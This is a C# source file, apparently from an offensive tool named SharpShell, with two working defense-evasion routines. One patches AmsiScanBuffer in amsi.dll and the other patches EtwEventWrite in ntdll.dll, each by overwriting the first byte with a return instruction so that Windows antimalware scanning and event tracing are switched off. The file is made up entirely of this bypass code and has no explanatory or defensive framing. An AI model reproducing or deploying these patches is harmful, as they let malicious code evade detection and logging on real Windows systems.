using System;
using System.Runtime.InteropServices;

namespace SharpShell
{
    public static class Patches
    {
        // Function to patch AMSI
        public static void PatchAMSI()
        {
            try
            {
                // Get handle for the amsi.dll
                IntPtr amsiDll = NativeMethods.LoadLibrary("amsi.dll");
                if (amsiDll == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to load amsi.dll.");
                    return;
                }

                // Get the address of AmsiScanBuffer function
                IntPtr amsiScanBuffer = NativeMethods.GetProcAddress(amsiDll, "AmsiScanBuffer");
                if (amsiScanBuffer == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get AmsiScanBuffer address.");
                    return;
                }

                // Patch the AMSI function by replacing the first bytes with 'ret' (0xC3)
                uint oldProtect;
                NativeMethods.VirtualProtect(amsiScanBuffer, (UIntPtr)1, 0x40, out oldProtect);
                Marshal.WriteByte(amsiScanBuffer, 0xC3);
                NativeMethods.VirtualProtect(amsiScanBuffer, (UIntPtr)1, oldProtect, out oldProtect);

                Console.WriteLine("[+] AMSI bypassed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error patching AMSI: " + ex.Message);
            }
        }

        // Function to patch ETW
        public static void PatchETW()
        {
            try
            {
                // Get handle for the ntdll.dll
                IntPtr ntdllDll = NativeMethods.LoadLibrary("ntdll.dll");
                if (ntdllDll == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to load ntdll.dll.");
                    return;
                }

                // Get the address of EtwEventWrite function
                IntPtr etwEventWrite = NativeMethods.GetProcAddress(ntdllDll, "EtwEventWrite");
                if (etwEventWrite == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to get EtwEventWrite address.");
                    return;
                }

                // Patch the ETW function by replacing the first bytes with 'ret' (0xC3)
                uint oldProtect;
                NativeMethods.VirtualProtect(etwEventWrite, (UIntPtr)1, 0x40, out oldProtect);
                Marshal.WriteByte(etwEventWrite, 0xC3);
                NativeMethods.VirtualProtect(etwEventWrite, (UIntPtr)1, oldProtect, out oldProtect);

                Console.WriteLine("[+] ETW bypassed.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error patching ETW: " + ex.Message);
            }
        }
    }

    // Helper class for P/Invoke definitions
    internal static class NativeMethods
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}
